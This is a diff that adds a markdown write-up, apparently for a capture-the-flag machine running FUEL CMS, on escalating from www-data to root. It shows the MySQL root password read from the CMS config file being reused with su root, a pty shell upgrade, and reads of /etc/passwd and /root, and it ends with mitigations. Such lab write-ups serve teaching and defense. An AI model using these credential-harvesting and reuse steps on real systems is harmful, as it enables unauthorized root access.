@@ -1,0 +1,104 @@
+# Privilege Escalation
+
+## Enumeration Summary
+
+After gaining initial access as `www-data`, the following privilege escalation vectors were investigated:
+
+| Vector | Result |
+|--------|--------|
+| Sudo privileges | ❌ None |
+| SUID binaries | ❌ No unusual binaries |
+| Kernel exploits | ❌ Kernel 4.15.0-45 - no obvious exploit |
+| Cron jobs | ❌ Nothing interesting |
+| Writable files | ❌ Limited write access |
+| Credential reuse | ✅ **Success** |
+
+## Privilege Escalation Method: Credential Reuse
+
+### Discovery
+
+During post-exploitation, the MySQL root password `mememe` was found in the FUEL CMS configuration file:
+
+```bash
+cat /var/www/html/fuel/application/config/database.php
+```
+
+### Attempting Password Reuse
+
+Since many administrators reuse passwords across services, we attempted to use the MySQL root password to authenticate as the system root user:
+
+```bash
+$ su root
+Password: mememe
+```
+
+### Root Access Achieved ✅
+
+```bash
+# whoami
+root
+
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+# hostname
+ubuntu
+
+# pwd
+/root
+```
+
+## Root Shell Stabilization
+
+```bash
+# Upgrade to full TTY
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# Set environment
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+export TERM=xterm
+```
+
+## Post-Root Enumeration
+
+```bash
+# List root directory
+# ls -la /root/
+total 32
+drwx------  3 root root 4096 Jan 15  2019 .
+drwxr-xr-x 23 root root 4096 Jan 15  2019 ..
+-rw-------  1 root root   32 Jan 15  2019 .bash_history
+-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
+drwxr-xr-x  2 root root 4096 Jan 15  2019 .nano
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   33 Jan 15  2019 root.txt
+```
+
+```bash
+# Check for other users
+# cat /etc/passwd | grep /bin/bash
+root:x:0:0:root:/root:/bin/bash
+```
+
+```bash
+# Check installed packages
+# dpkg -l | grep -i fuel
+# (FUEL CMS is not installed as a package - it's a web application)
+```
+
+## Why This Works
+
+This privilege escalation works because:
+
+1. The FUEL CMS application stores the MySQL root password in plaintext
+2. The system administrator reused the same password for the MySQL root account and the system root account
+3. This is a common security misconfiguration in development and testing environments
+
+## Mitigation
+
+To prevent this type of privilege escalation:
+
+1. **Never reuse passwords** across different services and accounts
+2. **Store credentials securely** - use environment variables or secret management tools instead of hardcoding in config files
+3. **Use separate database users** with limited privileges instead of the MySQL root account
+4. **Regularly audit configuration files** for exposed credentials
